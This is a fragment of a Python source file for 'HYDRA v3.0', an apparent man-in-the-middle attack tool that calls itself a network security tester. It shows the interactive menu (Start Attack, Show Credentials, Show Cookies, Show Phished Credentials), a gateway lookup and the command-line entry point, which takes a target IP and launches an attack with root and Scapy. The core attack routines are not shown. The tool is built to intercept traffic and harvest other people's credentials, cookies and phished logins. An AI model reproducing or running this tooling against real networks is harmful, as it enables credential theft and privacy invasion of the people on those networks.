{Colors.GREEN}[1]{Colors.WHITE} Discover Network (AI-Powered)
{Colors.GREEN}[2]{Colors.WHITE} Select Target
{Colors.GREEN}[3]{Colors.WHITE} Start Attack
{Colors.GREEN}[4]{Colors.WHITE} Show Status
{Colors.GREEN}[5]{Colors.WHITE} Show Devices
{Colors.GREEN}[6]{Colors.WHITE} Show Credentials
{Colors.GREEN}[7]{Colors.WHITE} Show Cookies
{Colors.GREEN}[8]{Colors.WHITE} Show Phished Credentials
{Colors.GREEN}[9]{Colors.WHITE} Export Results
{Colors.RED}[10]{Colors.WHITE} Stop Attack
{Colors.RED}[11]{Colors.WHITE} Exit
""")
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.discover_network()
            elif choice == '2':
                self.select_target()
            elif choice == '3':
                self.start_attack()
            elif choice == '4':
                self.show_status()
            elif choice == '5':
                self.show_devices()
            elif choice == '6':
                self.show_credentials()
            elif choice == '7':
                self.show_cookies()
            elif choice == '8':
                self.show_phished()
            elif choice == '9':
                self.export_results()
            elif choice == '10':
                self.stop_attack()
            elif choice == '11':
                if self.running:
                    self.stop_attack()
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid", Colors.RED)

#===============================================================================
# UTILITIES
#===============================================================================

class Utilities:
    @staticmethod
    def timestamp() -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_default_gateway() -> str:
        try:
            result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
            if result.stdout:
                match = re.search(r'default via ([\d.]+)', result.stdout)
                if match:
                    return match.group(1)
        except:
            pass
        return None

#===============================================================================
# MAIN
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="HYDRA v3.0 - Ultimate Mobile Network Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  sudo python3 hydra_v3.py -i eth0
  sudo python3 hydra_v3.py -i eth0 --target 192.168.1.100
  sudo python3 hydra_v3.py -i eth0 --scan
  sudo python3 hydra_v3.py -i eth0 --attack
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--target", help="Target IP")
    parser.add_argument("--scan", action="store_true", help="Scan network only")
    parser.add_argument("--attack", action="store_true", help="Attack target")
    
    args = parser.parse_args()
    
    print_banner()
    
    if os.geteuid() != 0:
        cprint("[!] Root required", Colors.RED)
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        cprint("[!] Scapy required: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    hydra = HydraV3(args.interface)
    
    if args.scan:
        hydra.discover_network()
        sys.exit(0)
    
    if args.target and args.attack:
        hydra.target_ip = args.target
        hydra.gateway_ip = Utilities.get_default_gateway()
        cprint(f"[+] Target: {hydra.target_ip}", Colors.GREEN)
        cprint(f"[+] Gateway: {hydra.gateway_ip}", Colors.GREEN)
        hydra.start_attack()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            hydra.stop_attack()
        sys.exit(0)
    
    if args.target:
        hydra.target_ip = args.target
        hydra.gateway_ip = Utilities.get_default_gateway()
        cprint(f"[+] Target: {hydra.target_ip}", Colors.GREEN)
        cprint(f"[+] Gateway: {hydra.gateway_ip}", Colors.GREEN)
    
    hydra.run_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
